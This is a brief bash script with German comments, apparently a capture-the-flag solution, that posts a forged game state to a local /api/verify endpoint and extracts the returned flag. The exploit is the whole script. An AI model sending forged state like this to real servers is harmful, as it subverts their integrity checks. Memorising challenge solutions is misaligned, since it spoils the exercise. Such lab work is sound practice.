#!/bin/bash

# Target URL (falls dein Docker auf einem anderen Port läuft, hier anpassen)
URL="http://localhost:3000/api/verify"

echo "[*] Sending exploited game state to the server..."

# Sende den manipulierten JSON-State via POST-Request
response=$(curl -s -X POST "$URL" \
     -H "Content-Type: application/json" \
     -d '{"player_score": 0, "npc_score": 24, "round": 5}')

# Überprüfen, ob die Flagge in der Antwort steckt
if echo "$response" | grep -q '"success":true'; then
    echo -e "\n[+] Exploit Successful! Flag found:"
    echo "$response" | grep -o '"flag":"[^"]*' | grep -o '[^"]*$'
else
    echo -e "\n[-] Exploit Failed. Server response:"
    echo "$response"
fi